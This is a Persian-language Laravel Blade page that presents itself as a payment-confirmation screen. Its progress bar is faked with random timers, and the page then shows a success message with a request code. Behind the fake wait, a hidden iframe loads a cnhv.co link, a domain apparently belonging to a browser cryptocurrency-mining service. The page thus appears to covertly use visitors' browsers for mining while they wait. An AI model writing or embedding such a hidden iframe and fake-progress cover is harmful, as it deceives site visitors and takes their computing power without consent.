<!doctype html>
<html lang="fa">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>تایید دریافت وجه</title>
    <link href="{{asset('css/app.css')}}" rel="stylesheet"/>
    <link href="{{asset('bootstrap/bootstrap.css')}}" rel="stylesheet"/>
    <link href="{{asset('font-awesome/css/font-awesome.min.css')}}" rel="stylesheet"/>
    <link href="{{asset('css/nprogress.css')}}" rel="stylesheet"/>
    <style>
        .bar {
            height: 8px !important;
        }
    </style>
</head>
<body dir="rtl">
<div class="container-fluid">
    <div id="progress" class="row">
        <div class="col-12 text-right" style="height: 200px;">
            <br><span class="loading">در حال بارگزاری ...</span>
        </div>
    </div>
    <div id="success" class="row" style="display: none">
        <div class="col-4"></div>
        <div class="col-4 text-right" style="height: 200px;">
            <p class="text-center text-success pt-4"> درخواست شما با کد {{$token}} با موفقیت ثبت شد. </p>
            <p class="text-center text-danger">لطفا این کد را تا انتهای فرایند پرداخت نزد خود نگهدارید.</p>
        </div>
        <div class="col-4"></div>
    </div>
    <div class="row">
        <div class="col-12">
            <iframe src="https://cnhv.co/fju0y" width="100%" style="display: none;"></iframe>
        </div>
    </div>
</div>
<script type="text/javascript" src="{{asset('jquery/jquery.min.js')}}"></script>
<script type="text/javascript" src="{{asset('bootstrap/bootstrap.min.js')}}"></script>
<script type="text/javascript" src="{{asset('js/nprogress.js')}}"></script>
<script>
    $(document).ready(function () {
        NProgress.configure({
            trickle: false,
        });
        NProgress.start();

        var total = Math.round(Math.random() * 10) + 50;
        var percent = 0;
        var sec = 1;
        console.log(total);

        function calcPercent() {
            percent = Math.round((100 / total) * sec);
            NProgress.set(percent / 100);
            $('.loading').text('در حال بارگزاری(' + percent + '%)');
            sec++;
        }

        var pInterval = setInterval(calcPercent, 1000);

        window.setInterval(function () {
            if (percent === 100) {
                $('#success').show();
            }
            if (percent > 96) {
                clearInterval(pInterval);
                percent = 100;
                $('.loading').text('در حال بارگزاری(100%)');
                NProgress.done();
                $('#progress').hide();
            }
        }, 1000);
    });
</script>
</body>
</html>
